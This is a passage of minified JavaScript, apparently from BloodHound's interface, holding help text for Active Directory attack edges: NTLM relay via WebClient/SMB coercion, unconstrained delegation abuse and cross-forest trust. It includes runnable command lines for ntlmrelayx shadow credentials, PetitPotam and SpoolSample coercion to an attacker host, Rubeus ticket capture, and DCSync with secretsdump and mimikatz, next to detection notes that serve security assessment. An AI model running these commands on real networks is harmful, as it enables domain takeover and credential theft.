Examples of tools include:",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),'To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"']})]}),Md={general:Rd,windowsAbuse:Nd,linuxAbuse:Ed,opsec:Id,references:$d,composition:Od,relaytargets:Gd},Ld=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'This edge indicates that the target computer has the WebClient service running. This enables an attacker with "Authenticated Users" access to trigger WebClient-based coercion from the target computer to their attacker-controlled host via NTLM. Since the connection originates from the WebClient instead of SMB, the attacker can relay the authentication attempt to the LDAP service of a domain controller that does not require LDAP signing. This relay can be used to abuse Active Directory permissions or obtain administrative access to the target computer using Resource-Based Constrained Delegation (RBCD) or Shadow Credentials.'}),e.jsx(t,{variant:"body2",children:"Click on Relay Targets to view the domain controllers in the domain that do not require LDAP signing."})]}),Fd=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["1. Start the Relay Server The NTLM relay can be executed with"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",children:"ntlmrelayx.py"}),". To relay to LDAP and perform a Shadow Credentials attack against the target computer:",e.jsx(w,{children:"ntlmrelayx.py -t ldap://<Domain Controller IP> --shadow-credentials"})]}),e.jsxs(t,{variant:"body2",children:["2. Coerce the Target Computer Several coercion methods are documented here:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),". Examples of tools include:",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),"To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE.",e.jsx(w,{children:'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'})]})]}),_d=()=>e.jsxs(t,{variant:"body2",children:["NTLM relayed authentications can be detected by login events where the IP address does not match the computer’s actual IP address. This detection technique is described in the blog post:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://posts.bluraven.io/detecting-ntlm-relay-attacks-d92e99e68fb9",children:"Detecting NTLM Relay Attacks"}),"."]}),Ud=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://en.hackndo.com/ntlm-relay/",children:"Hackndo: NTLM relay"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview",children:"Microsoft: NTLM Overview"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac",children:"Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Inveigh",children:"Inveigh"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/",children:"Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022",children:"I’m bringing relaying back: A comprehensive guide on relaying anno 2022"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",children:"ntlmrelayx.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://support.microsoft.com/en-us/topic/2020-2023-and-2024-ldap-channel-binding-and-ldap-signing-requirements-for-windows-kb4520412-ef185fb8-00f7-167d-744c-f299a66fc00a",children:"2020, 2023, and 2024 LDAP channel binding and LDAP signing requirements for Windows (KB4520412)"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.bluraven.io/detecting-ntlm-relay-attacks-d92e99e68fb9",children:"Detecting NTLM Relay Attacks"})]}),Wd=({sourceDBId:r,targetDBId:a,edgeName:o,onNodeClick:i})=>{const{isLoading:s,isError:c,nodesArray:d}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.relayTargets});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The nodes in this list are valid relay targets for this attack"}),e.jsx(l,{py:1,children:s?e.jsx(H,{variant:"rounded"}):c?e.jsx(K,{severity:"error",children:"Couldn't load relay targets"}):e.jsx(X,{nodes:d})})]})},Bd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"1: Start the Relay Server The NTLM relay can be executed with Inveigh."}),e.jsxs(t,{variant:"body2",children:["2: Coerce the Target Computer Several coercion methods are documented here:"," ",e.jsx("a",{href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),". Examples of tools include:",e.jsx("a",{href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("a",{href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),'To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"']})]}),qd={general:Ld,relaytargets:Wd,windowsAbuse:Bd,linuxAbuse:Fd,opsec:_d,references:Ud},Kd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'This edge indicates that the target computer has the WebClient service running. This enables an attacker with "Authenticated Users" access to trigger WebClient-based coercion from the target computer to their attacker-controlled host via NTLM. Since the connection originates from the WebClient instead of SMB, the attacker can relay the authentication attempt to LDAPS of a domain controller that does not require LDAPS channel binding. This relay can be used to abuse Active Directory permissions or obtain administrative access to the target computer using Resource-Based Constrained Delegation (RBCD) or Shadow Credentials.'}),e.jsx(t,{variant:"body2",children:"Click on Relay Targets to view the domain controllers in the domain that do not require LDAPS channel binding."})]}),zd=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["1. Start the Relay Server The NTLM relay can be executed with"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",children:"ntlmrelayx.py"}),". To relay to LDAP and perform a Shadow Credentials attack against the target computer:",e.jsx(w,{children:"ntlmrelayx.py -t ldaps://<Domain Controller IP> --shadow-credentials"})]}),e.jsxs(t,{variant:"body2",children:["2. Coerce the Target Computer Several coercion methods are documented here:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),". Examples of tools include:",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),"To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE.",e.jsx(w,{children:'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'})]})]}),Hd=()=>e.jsxs(t,{variant:"body2",children:["NTLM relayed authentications can be detected by login events where the IP address does not match the computer’s actual IP address. This detection technique is described in the blog post:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://posts.bluraven.io/detecting-ntlm-relay-attacks-d92e99e68fb9",children:"Detecting NTLM Relay Attacks"}),"."]}),Vd=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://en.hackndo.com/ntlm-relay/",children:"Hackndo: NTLM relay"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview",children:"Microsoft: NTLM Overview"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac",children:"Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Inveigh",children:"Inveigh"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/",children:"Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022",children:"I’m bringing relaying back: A comprehensive guide on relaying anno 2022"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",children:"ntlmrelayx.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://support.microsoft.com/en-us/topic/2020-2023-and-2024-ldap-channel-binding-and-ldap-signing-requirements-for-windows-kb4520412-ef185fb8-00f7-167d-744c-f299a66fc00a",children:"2020, 2023, and 2024 LDAP channel binding and LDAP signing requirements for Windows (KB4520412)"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.bluraven.io/detecting-ntlm-relay-attacks-d92e99e68fb9",children:"Detecting NTLM Relay Attacks"})]}),Yd=({sourceDBId:r,targetDBId:a,edgeName:o,onNodeClick:i})=>{const{isLoading:s,isError:c,nodesArray:d}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.relayTargets});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The nodes in this list are valid relay targets for this attack"}),e.jsx(l,{py:1,children:s?e.jsx(H,{variant:"rounded"}):c?e.jsx(K,{severity:"error",children:"Couldn't load relay targets"}):e.jsx(X,{nodes:d})})]})},Qd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"1: Start the Relay Server The NTLM relay can be executed with Inveigh."}),e.jsxs(t,{variant:"body2",children:["2: Coerce the Target Computer Several coercion methods are documented here:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),". Examples of tools include:",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),'To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"']})]}),Jd={general:Kd,relaytargets:Yd,windowsAbuse:Qd,linuxAbuse:zd,opsec:Hd,references:Vd},Xd=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},Zd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'This edge indicates that an attacker with "Authenticated Users" access can compromise the target computer by relaying the NTLM authentication of a victim computer with administrative rights on the target computer. The attack is possible because the attacker can trigger SMB-based coercion from the victim computer to their attacker-controlled host, and the target computer does not enforce SMB signing.'}),e.jsx(t,{variant:"body2",children:"Click on Relay Sources to view valid computers with administrative rights on the target computer that can be relayed. Click on Composition to view the full paths that lead to administrative rights on the target computer."})]}),eh=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["1. Start the Relay Server The NTLM relay can be executed with"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",children:"ntlmrelayx.py"}),"."]}),e.jsxs(t,{variant:"body2",children:["2. Coerce the Target Computer Several coercion methods are documented here:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),". Examples of tools include:",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"})]})]}),th=()=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["NTLM relayed authentications can be detected by login events where the IP address does not match the computer’s actual IP address. This detection technique is described in the blog post:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://posts.bluraven.io/detecting-ntlm-relay-attacks-d92e99e68fb9",children:"Detecting NTLM Relay Attacks"}),"."]})}),rh=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://en.hackndo.com/ntlm-relay/",children:"Hackndo: NTLM relay"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview",children:"Microsoft: NTLM Overview"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac",children:"Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Inveigh",children:"Inveigh"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/",children:"Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022",children:"I’m bringing relaying back: A comprehensive guide on relaying anno 2022"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",children:"ntlmrelayx.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://support.microsoft.com/en-us/topic/2020-2023-and-2024-ldap-channel-binding-and-ldap-signing-requirements-for-windows-kb4520412-ef185fb8-00f7-167d-744c-f299a66fc00a",children:"2020, 2023, and 2024 LDAP channel binding and LDAP signing requirements for Windows (KB4520412)"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.bluraven.io/detecting-ntlm-relay-attacks-d92e99e68fb9",children:"Detecting NTLM Relay Attacks"})]}),nh=({sourceDBId:r,targetDBId:a,edgeName:o,onNodeClick:i})=>{const{isLoading:s,isError:c,nodesArray:d}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.relayTargets});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The nodes in this list are valid relay sources for this attack"}),e.jsx(l,{py:1,children:s?e.jsx(H,{variant:"rounded"}):c?e.jsx(K,{severity:"error",children:"Couldn't load coercion targets"}):e.jsx(X,{nodes:d})})]})},ah=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"1: Take Over the SMB Port on the Attacker Host To avoid a conflict with SMB running on the attacker-controlled Windows computer, it is necessary to takeover the SMB port. This can be achieved with smbtakeover."}),e.jsxs(t,{variant:"body2",children:["2: Start the Relay Server The NTLM relay can be executed with"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Inveigh",children:"Inveigh"}),"."]}),e.jsxs(t,{variant:"body2",children:["3: Coerce the Target Computer Several coercion methods are documented here:"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),". Examples of tools include:",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/topotam/PetitPotam",children:"PetitPotam"})]})]}),oh={general:Zd,windowsAbuse:ah,linuxAbuse:eh,opsec:th,coerciontargets:nh,references:rh,composition:Xd},ih=({sourceName:r,sourceType:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," is configured with Kerberos unconstrained delegation."]}),e.jsxs(t,{variant:"body2",children:["Users and computers authenticating against ",r," will have their Kerberos TGT sent to"," ",r,", unless they are marked as sensitive or members of Protected Users."]}),e.jsxs(t,{variant:"body2",children:["An attacker with control over ",r," can coerce a Tier Zero computer (e.g. DC) to authenticate against ",r," and obtain the target's TGT. With the TGT of a DC, the attacker can perform DCSync to compromise the domain. Alternatively, the TGT can be used to obtain admin access to the target host with a shadow credentials + silver ticket attack or a resource-based constrained delegation attack."]})]}),sh=({sourceName:r,sourceType:a})=>{const o=e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"A common way for attackers to abuse unconstrained delegation is for the attacker to coerce a DC using the printspooler."}),e.jsx(t,{variant:"body2",children:"The attack will fail if the target is a member of Protected Users or marked as sensitive, as the TGT of those principals will not be sent to the principal with unconstrained delegation. You can find all the protected principals with this Cypher query:"}),e.jsx(w,{children:`MATCH (g:Group)
                WHERE g.objectid ENDS WITH "-525"
                MATCH (n:Base)
                WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)
                RETURN n
                LIMIT 1000`}),e.jsx(t,{variant:"body2",children:"There are many other coercion techniques than printspooler that can be used (see References)."})]});return a=="Computer"?e.jsxs(e.Fragment,{children:[o,e.jsx(t,{variant:"body1",children:"Step 1: Start monitoring for TGTs"}),e.jsx(t,{variant:"body2",children:"This step cannot be performed from Linux as we are abusing unconstrained delegation on a given AD computer, which is likely a Windows computer."}),e.jsxs(t,{variant:"body2",children:["Log in on the ",r," computer configured with unconstrained delegation and open CMD as Administrator."]}),e.jsx(t,{variant:"body2",children:"Start monitoring for incoming TGTs using Rubeus:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap"}),e.jsx(t,{variant:"body1",children:"Step 2: Coerce target DC"}),e.jsx(t,{variant:"body2",children:"Coerce the target DC using printerbug.py with the credentials of any AD user:"}),e.jsx(t,{component:"pre",children:"printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised computer IP>"}),e.jsx(t,{variant:"body2",children:"Rubeus will print the DC TGT as it is received."}),e.jsx(t,{variant:"body1",children:"Step 3: Pass the Ticket"}),e.jsx(t,{variant:"body2",children:"Save the TGT base64 blob as a .kirbi file:"}),e.jsx(t,{component:"pre",children:'echo "doIFvjCCBbqgAwI..." | base64 -d | tee ticket.kirbi > /dev/null'}),e.jsx(t,{variant:"body2",children:"Convert the TGT to ccache format using ticketConverter.py:"}),e.jsx(t,{component:"pre",children:"ticketConverter.py ticket.kirbi ticket.ccache"}),e.jsx(t,{variant:"body2",children:"Set the KRB5CCNAME environment variable to the ticket's path:"}),e.jsx(t,{component:"pre",children:"export KRB5CCNAME=$path_to_ticket.ccache"}),e.jsx(t,{variant:"body1",children:"Step 4: DCSync target domain"}),e.jsx(t,{variant:"body2",children:"Use secretsdump.py to DCSync the target domain:"}),e.jsx(t,{component:"pre",children:"secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>"})]}):e.jsxs(e.Fragment,{children:[o,e.jsx(t,{variant:"body2",children:"See 'Abusing Users Configured with Unconstrained Delegation' under References for details on the execution."})]})},ch=()=>e.jsx(t,{variant:"body2",children:"There is no opsec information for this edge."}),lh=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d",children:"Not A Security Boundary: Breaking Forest Trusts"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1",children:"Hunting in Active Directory: Unconstrained Delegation & Forests Trusts"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://exploit.ph/user-constrained-delegation.html",children:"Abusing Users Configured with Unconstrained Delegation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"(RBCD) Resource-based constrained"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus",children:"Rubeus"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/gentilkiwi/mimikatz",children:"mimikatz"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py",children:"ticketConverter.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",children:"secretsdump.py"})]}),dh=({sourceName:r,sourceType:a})=>{const o=e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"A common way for attackers to abuse unconstrained delegation is for the attacker to coerce a DC using the printspooler."}),e.jsx(t,{variant:"body2",children:"The attack will fail if the target is a member of Protected Users or marked as sensitive, as the TGT of those principals will not be sent to the principal with unconstrained delegation. You can find all the protected principals with this Cypher query:"}),e.jsx(w,{children:`MATCH (g:Group)
                WHERE g.objectid ENDS WITH "-525"
                MATCH (n:Base)
                WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)
                RETURN n
                LIMIT 1000`}),e.jsx(t,{variant:"body2",children:"There are many other coercion techniques than printspooler that can be used (see References)."})]});return a=="Computer"?e.jsxs(e.Fragment,{children:[o,e.jsx(t,{variant:"body1",children:"Step 1: Start monitoring for TGTs"}),e.jsxs(t,{variant:"body2",children:["Log in on the ",r," computer configured with unconstrained delegation and open CMD as Administrator."]}),e.jsx(t,{variant:"body2",children:"Start monitoring for incoming TGTs using Rubeus:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap"}),e.jsx(t,{variant:"body1",children:"Step 2: Coerce target DC"}),e.jsx(t,{variant:"body2",children:"From any host in the domain, coerce the target DC using SpoolSample:"}),e.jsx(t,{component:"pre",children:"SpoolSample.exe targetdc.domain.local uncondel.domain.local"}),e.jsx(t,{variant:"body2",children:"Rubeus will print the DC TGT as it is received."}),e.jsx(t,{variant:"body2"}),e.jsx(t,{variant:"body1",children:"Step 3: Pass the Ticket"}),e.jsx(t,{variant:"body2",children:"Inject the DC TGT into memory using Rubeus on any computer in the domain:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI..."}),e.jsx(t,{variant:"body1",children:"Step 4: DCSync target domain"}),e.jsx(t,{variant:"body2",children:"Use mimikatz to DCSync the domain from the computer where the DC TGT was injected:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:domain.local /user:DOMAIN\\Administrator"})]}):e.jsxs(e.Fragment,{children:[o,e.jsx(t,{variant:"body2",children:"See 'Abusing Users Configured with Unconstrained Delegation' under References for details on the execution."})]})},hh={general:ih,windowsAbuse:dh,linuxAbuse:sh,opsec:ch,references:lh},ph=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Permissions on the parent of a child object may enable compromise of the child object through inherited ACEs or linked GPOs."}),e.jsx(t,{variant:"body2",children:"See the inbound edges on the parent object for details."})]}),uh=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:[N(a)," ",r," contains the ",N(i)," ",o,"."]})}),mh=()=>e.jsx(t,{variant:"body2",children:"There are no opsec considerations related to this edge."}),bh=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://wald0.com/?p=179",children:"https://wald0.com/?p=179"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.cptjesus.com/posts/bloodhound15",children:"https://blog.cptjesus.com/posts/bloodhound15"})]}),fh={general:uh,abuse:ph,opsec:mh,references:bh},yh=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The cross-forest trust does not enable a compromise of any of the domains by default."}),e.jsx(t,{variant:"body2",children:"BloodHound creates separate traversable edges between the domains if the configuration of the trust enables abuse."})]}),gh=({sourceName:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The CrossForestTrust edge represents a cross-forest (interforest) trust relationship between two domains/forests. In this relationship, the ",r," domain has a cross-forest trust to the"," ",a," domain, allowing principals (users and computers) from ",a," to access resources in"," ",r,"."]}),e.jsx(t,{variant:"body1",children:"Trust Edge Properties"}),e.jsx(t,{variant:"body2",children:"BloodHound stores the following properties for CrossForestTrust edges (listed under Relationship Information):"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Spoof SID History Blocked"}),e.jsx("br",{}),"An attacker with control over the trusted domain may attempt to escalate privileges in the trusting domain using a ",e.jsx("i",{children:"spoof SID history"})," attack by injecting the SID of a privileged principal from the trusting domain into their authentication request. However, this attack can be prevented by SID 